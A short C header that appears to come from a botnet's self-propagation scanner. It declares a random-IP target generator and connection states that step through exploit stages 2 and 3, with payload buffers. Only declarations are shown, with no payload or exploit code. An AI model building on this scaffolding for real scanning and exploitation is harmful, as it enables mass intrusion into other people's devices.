#pragma once

#include <stdint.h>

#include "includes.h"

#define REPSCANNER_SCANNER_MAX_CONNS 512
#define REPSCANNER_SCANNER_RAW_PPS 720

#define REPSCANNER_SCANNER_RDBUF_SIZE 1024
#define REPSCANNER_SCANNER_HACK_DRAIN 64

struct repscanner_scanner_connection
{
    int fd, last_recv;
    enum
    {
        REPSCANNER_SC_CLOSED,
        REPSCANNER_SC_CONNECTING,
        REPSCANNER_SC_EXPLOIT_STAGE2,
        REPSCANNER_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[REPSCANNER_SCANNER_RDBUF_SIZE];
    char payload_buf[2024];
	char payload_buf2[2024];
};

void repscanner_scanner_init();
void repscanner_scanner_kill(void);

static void repscanner_setup_connection(struct repscanner_scanner_connection *);
static ipv4_t repscanner_get_random_ip(void);


